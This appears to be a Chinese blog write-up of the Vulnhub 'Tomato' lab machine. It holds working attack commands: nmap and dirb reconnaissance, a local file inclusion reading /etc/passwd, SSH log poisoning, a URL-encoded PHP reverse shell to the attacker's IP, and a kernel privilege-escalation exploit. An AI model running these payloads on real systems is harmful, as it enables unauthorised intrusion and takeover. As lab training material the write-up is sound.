> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/40zG1Tjmo_8pbbpN-IWZ4A)

**点击蓝字**  

关注我们

0x00 靶机信息  

靶机: Tomato

难度: 中—难

下载: https://www.vulnhub.com/entry/tomato-1,557/

0x01 信息收集

Nmap 扫描当前网段来确定靶场 IP  

```
nmap -sP 192.168.12.1/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdicMPnBMIp6C9uUXDWmPMue0782LSvwzaAFARPeP4lMu1qgfufU4QxIiaw/640?wx_fmt=png)

接下来在扫描端口的同时访问靶场 WEB 服务

```
nmap -p- 192.168.12.129
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdicZhWAJ3N33icFnAI4Yibxp5Kc2yggNk9DNu3SZ1mib7Zk7iaH0WDRuicszCw/640?wx_fmt=png)

发现 21，80，2211，8888，四个端口

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdicotQrQnLf6pwhrBr9ebh0HibmeSpZkJahZibTL6FUJldf7r1UHHnQC2MA/640?wx_fmt=png)

接下来扫描一下网站目录

```
dirb http://192.168.12.129/
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdicrcReCE9jBHS9B03ljM1ZymXaq22IONr5kutl5hKMO3DwicmulNGx4yg/640?wx_fmt=png)

访问 antibot_image 发现存在目录遍历

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0Zgibdic5VnVdBFUHbByQLa7Yc6Rw0hF0KAd9D14BeH6qoh3RlLX1Qq5lDHo2A/640?wx_fmt=png)

在 antibot_image/antibots 文件夹内发现 info.php

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0Zgibdic2JNia8JmGj6OfAMYiaplVAM42yVwCkOiaZzaUgtw1J2ic6pDAz8UbY3kpw/640?wx_fmt=png)

寻找有价值信息，在源码内发现注释

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdicCibnxYwM9FJhMz0ibU58ozQCXJSIzSVGibK3L5lFuzIexEm5tKibBNqsqA/640?wx_fmt=png)

0x02 漏洞利用

直接利用文件包含访问 passwd  

```
http://192.168.12.129/antibot_image/antibots/info.php?image=../../../../../etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdicFFY0fh9YmzoTc83saU6M9MERLxNibX04aylhAmWLFa9JhkQibwEJo24w/640?wx_fmt=png)

接下来尝试文件包含被污染的 SSH 日志来 getshell

```
ssh ''@192.168.12.129 -p2211
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0Zgibdic8V18iaJuroHf7JicqU5fcYLRKCKYsMVb9ququY4n2z3Cmz6P83tmWyog/640?wx_fmt=png)

开启 nc 监听

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdicuaRdicdwTMmTMNicfbwNagaUsvnpMvOZMlM9R9jgicHWblO1K6pib5BMRQ/640?wx_fmt=png)

反弹 shell   将

```
http://192.168.12.129/antibot_image/antibots/info.php?image=../../../../../var/log/auth.log&shell=php -r '$sock=fsockopen("192.168.12.130",3388);exec("/bin/sh -i &3 2>&3");'
```

进行 URL 编码  

```
http://192.168.12.129/antibot_image/antibots/info.php?image=../../../../../var/log/auth.log&shell=php+-r+%27%24sock%3dfsockopen(%22192.168.12.130%22%2c3388)%3bexec(%22%2fbin%2fsh+-i+%3c%263+%3e%263+2%3e%263%22)%3b%27
```

访问 URL，成功反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdicMiboaMia43n3UX94rhkDavpy23Nt0fSqh3dEk9WcH9Ugw65PdZWsfDVA/640?wx_fmt=png)

0x03 提权

开启交互 shell

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdicN6XTia2xaSB6aX11PfVjoSElvf2VWkj4nmo8c4BMib9sGVQNWaCLPICQ/640?wx_fmt=png)

下载提权脚本

```
git clone https://github.com/kkamagui/linux-kernel-exploits.git
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdichgkMLNZdNHEloZBwp321VvRibZvAOjsqx1icxDIuzhDG2taH1zrqVCew/640?wx_fmt=png)

在脚本中找到对应的提权脚本，执行 sh 文件编译 exp

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0Zgibdic8M2TPabFY1iaJ3bu7KApI6YjCIhzpJtqS6ibmIkKfmnZDZ9Ldobov3CA/640?wx_fmt=png)

开启 apache2，把 exp 上传到网站根目录下

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0Zgibdic7LBbSh97rFaCKKmARDgQm7dPEJumicj0IIkdy9317aP4KtLF0ZM2K3A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdicQgIA9ca0Q7Hod2g8eFmdWZqskcaeIbYNicCHTtQE6adby4vKfiaerLpg/640?wx_fmt=png)

下载 exp 赋予 777 权限并执行

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0ZgibdiccdzSRQZeLTVrBoh6JuBrMmxEwBaWJzibSppVI2ETUswx7G661IccUnw/640?wx_fmt=png)

拿到 flag

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsdscUZmbibNPRAHCWg0Zgibdicft4fWP7Yb4ZTc5SibhlVxW0jz7Zx51KwdMaRicLT9XswrQlicvqKjvR6Q/640?wx_fmt=png)

 **往期推荐 ·**

  

[Vulnhub 篇 chili](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483773&idx=1&sn=6d0e5dc2f04a1cec1f01b4848a4a1582&chksm=eb4ec8c0dc3941d638f47dcb06959d7ae311a9d5a8d38780f397f899f31766bbadb3606f3f18&scene=21#wechat_redirect)

[Vulnhub 篇 Photographerr:1](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483673&idx=1&sn=c1f22eebcf5affb13ae324af7a030449&chksm=eb4ec8a4dc3941b21b2078a6e5d84462ac0ae5253b9176c12d9e3d53539ba27e2d8fbe36f85f&scene=21#wechat_redirect)  

[Vulnhub 篇 presidential:1](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483700&idx=1&sn=5a54f2be75bd9bdf0d3a84367ea8afb2&chksm=eb4ec889dc39419f55e446dafd3e5aa26379cbc24b048b3d7624a3fb510ad87847b828b6e1b4&scene=21#wechat_redirect)  

[暗黑引擎—Shodan 常用搜索语法](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483732&idx=1&sn=8a93eac665e72b9eab0c41e3d509fd57&chksm=eb4ec8e9dc3941ff4542d62319b42e58fe1863727740c465aa954b57fbbf1503d8e8fa94a2da&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Cse7ScwpcZ0hYFNyAKSke4yDtZo2F6PWmVicuic2AWqOhAZTDChCHULs8kCwFBsCjp1zkicUUKibT9icgzw/640?wx_fmt=png)